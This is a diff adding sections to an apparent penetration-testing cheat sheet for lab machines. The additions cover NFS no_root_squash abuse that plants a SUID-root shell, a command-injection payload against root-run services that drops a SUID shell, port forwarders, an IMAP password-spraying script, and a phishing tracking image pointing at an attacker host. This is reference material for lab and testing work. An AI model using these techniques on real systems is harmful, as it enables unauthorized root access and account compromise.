@@ -291,6 +291,23 @@ The following command is enumerating opened tcp ports (0-1000) in 172.19.0.1 (e.
  for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT &>/dev/null" 2>/dev/null &&  echo "port $PORT is open"; done
 ```
 
+### NFS (Network File System)
+Ports 111 (rpcbind) / 2049 (nfs). Exports may be world-readable/writable and are a common initial-access source (SSH keys, creds, PDFs).
+```shell
+showmount -e $IP                                   # list exported shares
+sudo mkdir -p /mnt/nfs
+sudo mount -t nfs -o vers=3,ro,nolock $IP:/<export> /mnt/nfs
+ls -lan /mnt/nfs                                    # note owner UID/GID
+```
+Access denied but file owned by a specific UID? Create a local user with that UID to read it:
+```shell
+sudo useradd -u <uid> tmpuser && sudo -u tmpuser cat /mnt/nfs/<file>
+```
+`no_root_squash` misconfig: mount rw as root, plant a SUID-root binary in a shared path, then execute it on the target for root.
+```shell
+sudo mount -t nfs -o vers=3,rw,nolock $IP:/<export> /mnt/nfs
+cp /bin/bash /mnt/nfs/rootbash && chmod +s /mnt/nfs/rootbash   # run ./rootbash -p on target
+```
 
 ## Windows Privilege Escalation
 ### PowerUp.ps1
@@ -333,6 +350,25 @@ Monitoring the process at an interval of 1ms. (If the interval value is not set,
 ```
 ./pspy64 -i 1
 ```
+
+### Internal services running as root -> privesc
+Local-only services (bound to `127.0.0.1`) are a frequent privesc path — enumerate listeners and the user running each, then reach it via an in-shell forward (see Port Forwarding).
+```shell
+ss -ltnp                                    # listening TCP + owning process (or: netstat -tlnp)
+ps -ef | grep -v grep                       # match a listener PID to its user/cmdline
+ls -la /opt /srv /etc/<app>                 # locate the service's config/binary
+```
+Generic wins once you can talk to a service that executes as root:
+- **Unescaped shell-template argument injection**: if the service builds a command from user input without escaping, break out of the quoting and chain your own command. Drop a SUID shell for stable root.
+```
+# template:  cmd -p'{{ arg }}'   ->   set arg to:
+';cp /bin/bash /tmp/0;chmod 6755 /tmp/0;'
+# then as any user:
+/tmp/0 -p -c 'id; cat /root/root.txt'
+```
+- **Writable definition file**: if a config/task file the root service loads is owned/writable by a user you control, edit it to run your command, then trigger a reload/action.
+- **Weak/absent auth**: admin/task runners often default to no authentication on localhost.
+
 ## Kubernetes
 ### Enumerate pods (kubeletctl)
 Kubeletctl is a command line tool that implement kubelet's API.
@@ -770,6 +806,40 @@ Client:
 
 After running the above commands, we can access http://127.0.0.1:8081/ in attacker PC.
 
+### In-shell forward without SSH (socat / ncat / python)
+When SSH is unavailable (connection closed pre-auth) but you already have a shell, expose an internal-only service (e.g. `127.0.0.1:1337`) on a reachable port so your browser/tools can hit it. The python variant needs no uploaded binary.
+```shell
+# socat
+socat TCP-LISTEN:8888,fork,reuseaddr TCP:127.0.0.1:1337 &
+# ncat (has -e/-c; OpenBSD nc does not)
+ncat -lk 8888 -c 'ncat 127.0.0.1 1337' &
+```
+Pure-python forwarder (no dependency, handles multiple connections):
+```python
+python3 - <<'PY' &
+import socket,threading
+def pipe(a,b):
+    while True:
+        d=a.recv(4096)
+        if not d: break
+        b.sendall(d)
+def h(c):
+    s=socket.create_connection(("127.0.0.1",1337))
+    threading.Thread(target=pipe,args=(c,s),daemon=True).start(); pipe(s,c)
+l=socket.socket(); l.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+l.bind(("0.0.0.0",8888)); l.listen(50)
+while True:
+    c,_=l.accept(); threading.Thread(target=h,args=(c,),daemon=True).start()
+PY
+```
+Then browse `http://<target_ip>:8888`.
+
+### Fix stalled transfers (HTB VPN MTU)
+Large downloads stalling at 0% over the VPN is usually MTU/fragmentation. Lower the tun MTU:
+```shell
+sudo ip link set dev tun0 mtu 1200
+```
+
 ## Unix Socket Forwarding 
 ### PostgreSQL
 PostgreSQL listening behavior is defined at startup via configuration files.
@@ -795,6 +865,48 @@ rlogin <target_ip> -l root                    # Interactive login
 
 - Located at ~/.rhosts, it must contain trusted entries like intern.build.vl root or + + to enable passwordless access.
 - Exploitation involves spoofing DNS (PTR records) so the target resolves your IP to the trusted hostname defined in the file.
+
+# Mail (IMAP / POP3 / SMTP)
+Mail stacks (Dovecot/Postfix) + webmail (Roundcube) are common footholds: read mail for creds/links, reuse passwords across users, or exploit the webmail app.
+
+## Confirm service / grab banner over TLS
+```shell
+openssl s_client -connect $IP:993 -quiet          # IMAPS greeting (* OK ... ready)
+openssl s_client -connect $IP:995 -quiet          # POP3S
+openssl s_client -connect $IP:143 -starttls imap
+```
+Gotcha: a front proxy may drop the TLS handshake for the "wrong" SNI (`UNEXPECTED_EOF_WHILE_READING`). Try no SNI / by IP / a different `-servername`, or just validate creds via the webmail UI instead of direct IMAPS.
+
+## Login & enumerate mailbox (Python)
+```python
+import imaplib
+M = imaplib.IMAP4_SSL("mail.host", 993, timeout=8)
+M.login("user", "pass")
+print(M.list())          # folders (look for Shared/Public namespaces)
+print(M.namespace())
+M.select("INBOX"); print(M.search(None, "ALL"))
+```
+Note: interactive `bash` history-expands `!` inside passwords. Use `pw='Pass'+chr(33)` or `set +H`.
+
+## Password spraying across mail users
+```python
+import imaplib
+pw = 'Spring2024'+chr(33)                          # chr(33) = '!' (avoids bash history-expansion)
+for u in ['admin','support','it','user1','user2']:
+    try:
+        M = imaplib.IMAP4_SSL("mail.host", 993, timeout=8); M.login(u, pw)
+        print("[+] SUCCESS", u, M.list()[1]); M.logout()
+    except Exception as e:
+        print("[-] fail   ", u, str(e)[:60])
+```
+Do not trust a silently-empty tool result as "auth failed" — confirm the method works with a known-good credential first (a curl/imaplib call can return nothing on success too).
+
+## Roundcube / webmail
+- Fingerprint the version via the **About** dialog. Map version -> CVE (a fully-patched webmail means the path is the mail content, not the app).
+- Read **INBOX / Sent / Trash / Contacts / Settings->Filters(Sieve)** for creds & internal hosts.
+- Message **Headers** (`Received:`) can leak internal hostnames / vhosts.
+- Vhosts can use odd naming (underscores/numbers, e.g. `support_001.corp.local`) that generic subdomain lists miss — harvest them from mail bodies/headers.
+- Compose an HTML mail with a tracking `<img src=http://ATTACKER/x.png>` / link to detect an automated reader (phishing a simulated user).
 
 # Depixelize
 ## Depix
